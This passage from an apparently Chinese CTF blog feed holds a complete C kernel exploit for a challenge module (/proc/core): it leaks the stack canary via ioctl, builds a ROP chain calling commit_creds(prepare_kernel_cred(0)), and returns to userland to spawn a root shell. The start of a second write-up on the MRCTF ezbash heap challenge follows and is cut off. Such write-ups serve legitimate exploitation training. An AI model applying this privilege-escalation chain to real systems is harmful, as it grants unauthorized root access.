class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/stat.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;sys/ioctl.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; CORE_READ 0x6677889B&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; CORE_OFF 0x6677889C&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; CORE_COPY 0x6677889A&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; vmlinux_base, commit_creds, prepare_kernel_cred;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; user_cs, user_ss, user_sp, user_rflags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; raw_vmlinux_base = &lt;span class=&#34;number&#34;&gt;0xffffffff81000000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;GetAddress&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; buf[&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; FILE* fd = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;/tmp/kallsyms&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;r&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!fd) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] ERROR.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(fgets(buf, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(buf), fd)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (commit_creds &amp;amp;&amp;amp; prepare_kernel_cred)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Find: commit_creds: 0x%llx\n[+] Find: prepare_kernel_cred: 0x%llx\n&amp;quot;&lt;/span&gt;, commit_creds, prepare_kernel_cred);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;strstr&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;commit_creds&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   commit_creds = strtoull(buf, ptr, &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;strstr&lt;/span&gt;(buf, &lt;span class=&#34;string&#34;&gt;&amp;quot;prepare_kernel_cred&amp;quot;&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   prepare_kernel_cred = strtoull(buf, ptr, &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;SaveStatus&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; __asm__(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;mov user_cs, cs;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;mov user_ss, ss;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;mov user_sp, rsp;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;pushf;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;string&#34;&gt;&amp;quot;pop user_rflags;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;GetShell&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!getuid()) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  system(&lt;span class=&#34;string&#34;&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] CAN NOT GETSHELL.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; rop[&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; user_buf[&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;* ptr;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i = &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; SaveStatus();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; GetAddress();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; vmlinux_base = commit_creds - &lt;span class=&#34;number&#34;&gt;0x9c8e0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; offset = vmlinux_base - raw_vmlinux_base;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; pop_rdi = &lt;span class=&#34;number&#34;&gt;0xffffffff81679ba8&lt;/span&gt; + offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; pop_rdx = &lt;span class=&#34;number&#34;&gt;0xffffffff810a0f49&lt;/span&gt; + offset;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; mov_rdi_rax = &lt;span class=&#34;number&#34;&gt;0xffffffff8106a6d2&lt;/span&gt; + offset; &lt;span class=&#34;comment&#34;&gt;// mov rdi, rax; jmp rdx;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; swapgs = &lt;span class=&#34;number&#34;&gt;0xffffffff81a012da&lt;/span&gt; + offset;  &lt;span class=&#34;comment&#34;&gt;// swapgs; popfq; ret;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; iretq = &lt;span class=&#34;number&#34;&gt;0xffffffff81050ac2&lt;/span&gt; + offset;   &lt;span class=&#34;comment&#34;&gt;// iretq; ret;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; fd = open(&lt;span class=&#34;string&#34;&gt;&amp;quot;/proc/core&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!fd) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;puts&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[-] OPEN /proc/core ERROR.&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;exit&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ioctl(fd, CORE_OFF, &lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;);															&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; ioctl(fd, &lt;span class=&#34;number&#34;&gt;0x6677889B&lt;/span&gt;, user_buf); &lt;span class=&#34;comment&#34;&gt;//canary in buf.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; canary = ((&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;*)user_buf)[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;built_in&#34;&gt;printf&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;[+] Find canary: 0x%llx\n&amp;quot;&lt;/span&gt;, canary);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;//commit_creads(prepare_kernel_cred(0));&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = canary;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = pop_rdi;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = prepare_kernel_cred;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = pop_rdx;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = commit_creds;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = mov_rdi_rax;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;span class=&#34;comment&#34;&gt;//swapgs --&amp;gt; iretq: rip, cs, rflags, rsp, ss. GetShell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = swapgs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = iretq;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = (&lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt;)GetShell;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = user_cs;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = user_rflags;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = user_sp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; rop[i++] = user_ss;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; write(fd, rop, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(rop));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ioctl(fd, CORE_COPY, &lt;span class=&#34;number&#34;&gt;0xffffffffffff0000&lt;/span&gt;|&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//传入一个负数，因为会被转为16位（2bytes）无符号数，最后的调用为 qmemcpy(v2, &amp;amp;name, 0x100);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;如何上穿exp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#如何上穿exp&#34;&gt;#&lt;/a&gt; 如何上穿 exp。？&lt;/h2&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/25/MRCTF-ezbash/</guid>
            <title>MRCTF_ezbash</title>
            <link>http://example.com/2022/04/25/MRCTF-ezbash/</link>
            <category>writeup</category>
            <pubDate>Mon, 25 Apr 2022 12:53:57 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;mrctf-pwnezbash&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mrctf-pwnezbash&#34;&gt;#&lt;/a&gt; MRCTF 	pwn	ezbash&lt;/h1&gt;
&lt;p&gt;拿到题目的时候，直接运行起来发现是一个文件系统，怀疑是不是一个 kernel 的题目，但是并没有给出内核文件，所以认定了就是一道堆题。这也是我坚持做下去的原因。&lt;/p&gt;
&lt;h2 id=&#34;题目链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#题目链接&#34;&gt;#&lt;/a&gt; 题目链接&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2RyZWFta2VjYXQvZHJlYW1rZWNhdC5naXRodWIuaW8vdHJlZS9tYWluL2NoYWxsZW5nZS9NUmN0Zl9lemJhc2g=&#34;&gt;https://github.com/dreamkecat/dreamkecat.github.io/tree/main/challenge/MRctf_ezbash&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;环境&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境&#34;&gt;#&lt;/a&gt; 环境&lt;/h2&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ strings libc.so.6 |grep ubuntu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;GNU C Library (Ubuntu GLIBC 2.31-0ubuntu9.7) stable release version 2.31.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;https://bugs.launchpad.net/ubuntu/+&lt;span class=&#34;built_in&#34;&gt;source&lt;/span&gt;/glibc/+bugs&amp;gt;.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/mrctf/ezbash$  checksec --file=ezbash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   No Symbols	  No	0		7		ezbash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;2.31 的题目，保护全开，八成就是堆题；&lt;/p&gt;
&lt;p&gt;程序模拟了一个简单的文件系统，提供了 11 种命令，对于我们命令行的输出，程序会进行切片&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop/mrctf/ezbash$ ./ezbash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;hacker:/$ &lt;span 